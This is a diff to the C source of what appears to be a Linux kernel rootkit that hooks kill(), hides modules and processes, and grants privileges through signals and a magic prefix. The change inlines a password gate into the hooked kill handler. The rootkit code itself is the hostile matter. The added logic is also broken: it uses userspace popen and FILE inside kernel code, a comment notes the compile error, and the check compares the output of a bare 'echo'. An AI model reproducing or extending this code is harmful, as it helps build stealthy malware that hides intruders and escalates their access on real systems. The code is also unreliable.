@@ -4,6 +4,10 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
+#include <stdio.h>//ADDED
+#include <stdlib.h>//ADDED
+
+#define BUFFER_SIZE 1024//ADDED
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -297,32 +301,6 @@ module_hide(void)
 	module_hidden = 1;
 }
 
-bool passw_check(){//ADDED
-	bool passed = true;
-	FILE *fp;
-	char path[BUFFER_SIZE];
-	char output[BUFFER_SIZE] = "read -p \"Enter: \" -s pw && echo \"$pw\""; // Allocate a buffer to hold the output
-	char* command = "echo "; // Command to execute
-	fp = popen(command, "r"); // Open the command for reading
-	if (fp != NULL) { // Check if popen failed
-		// Read the output of the command and copy it to the output buffer
-		fgets(path, sizeof(path)-1, fp);
-		for (int i = 0; i < BUFFER_SIZE && path[i] != '\0'; i++) {
-			output[i] = path[i];
-		}
-		pclose(fp); // Close the pipe
-		// Compare the output to the string "test"
-		char test[] = MAGIC_PREFIX;
-		for (int i = 0; i < BUFFER_SIZE && output[i] != '\0' && test[i] != '\0'; i++) {
-			if (output[i] != test[i]) {
-				passed = FALSE;
-				break;
-			}
-		}
-	} else { passed = FALSE; }
-	return passed;
-}//end of passw_check
-
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 	asmlinkage int
 	hacked_kill(const struct pt_regs *pt_regs)
@@ -354,7 +332,28 @@ hacked_kill(pid_t pid, int sig)
 	bool pwTried = FALSE;
 	bool pwPassed = FALSE;
 	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
-		pwPassed = passw_check();
+		pwPassed = TRUE;
+		FILE *fp;//DEBUG TODO: error "unknown type name FILE" (its in stdio.h)
+		char path[BUFFER_SIZE];
+		char output[BUFFER_SIZE] = "read -p \"Enter: \" -s pw && echo \"$pw\""; // Allocate a buffer to hold the output
+		char* command = "echo "; // Command to execute
+		fp = popen(command, "r"); // Open the command for reading
+		if (fp != NULL) { // Check if popen failed
+			// Read the output of the command and copy it to the output buffer
+			fgets(path, sizeof(path)-1, fp);
+			for (int i = 0; i < BUFFER_SIZE && path[i] != '\0'; i++) {
+				output[i] = path[i];
+			}
+			pclose(fp); // Close the pipe
+			// Compare the output to the string "test"
+			char test[] = MAGIC_PREFIX;
+			for (int i = 0; i < BUFFER_SIZE && output[i] != '\0' && test[i] != '\0'; i++) {
+				if (output[i] != test[i]) {
+					pwPassed = FALSE;
+					break;
+				}
+			}
+		} else { pwPassed = FALSE; }
 		pwTried = TRUE;
 	}
 
